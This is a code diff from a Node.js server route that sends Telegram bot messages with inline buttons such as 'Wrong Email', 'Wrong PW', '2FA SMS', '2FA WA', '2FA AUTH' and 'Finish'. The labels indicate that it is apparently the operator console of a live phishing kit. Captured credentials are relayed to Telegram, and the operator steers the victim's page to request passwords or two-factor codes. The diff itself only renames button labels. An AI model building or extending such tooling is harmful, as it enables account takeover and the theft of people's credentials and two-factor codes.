@@ -111,12 +111,12 @@ app.post('/send-message', (req, res) => {
   bot.sendMessage(chatId, `${message}`, {
     reply_markup: {
       inline_keyboard: [
-        [{ text: 'Loading', callback_data: 'perform_action' }],
+        [{ text: '2FA WA', callback_data: 'perform_action' }],
         [{ text: 'Wrong Email', callback_data: 'perform_action2' }],
         [{ text: 'Wrong PW', callback_data: 'perform_action3' }],
-        [{ text: '2FA', callback_data: 'perform_action4' }],
-        [{ text: '2FA Email', callback_data: 'perform_action7' }],
-        [{ text: '2FA Auth', callback_data: 'perform_action8' }],
+        [{ text: '2FA SMS', callback_data: 'perform_action4' }],
+        [{ text: '2FA EMAIL', callback_data: 'perform_action7' }],
+        [{ text: '2FA AUTH', callback_data: 'perform_action8' }],
         [{ text: 'Wrong 2FA', callback_data: 'perform_action5' }],
         [{ text: 'Finish', callback_data: 'perform_action6' }],
       ],
